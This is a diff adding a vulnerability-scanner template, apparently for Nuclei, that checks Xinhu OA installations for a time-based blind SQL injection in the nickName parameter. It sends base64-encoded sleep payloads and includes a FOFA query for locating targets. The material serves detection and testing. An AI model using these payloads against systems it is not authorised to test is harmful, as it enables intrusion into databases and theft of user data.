@@ -1,0 +1,38 @@
+id: xinhuOA-nickName-sql
+
+info:
+  name: 信呼OA nickName SQL注入漏洞(XVE-2024-19304)
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: app="信呼-OA系统"
+    信呼OA nickName 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247485918&idx=1&sn=f1ffea054e8a84ea9d962d2bec81f149&chksm=c267bcedf51035fb6af2ac2f46c39b6bc613de256bc88cd38c3270c1a91bacd3c4f9c24c025d&token=1619136955&lang=zh_CN#rd
+  tags: sql injection
+
+
+http:
+  - raw:
+      - |
+        GET /index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDQpIw== HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+      - |
+        GET /index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDgpIw== HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
+
+
+
+
+
+
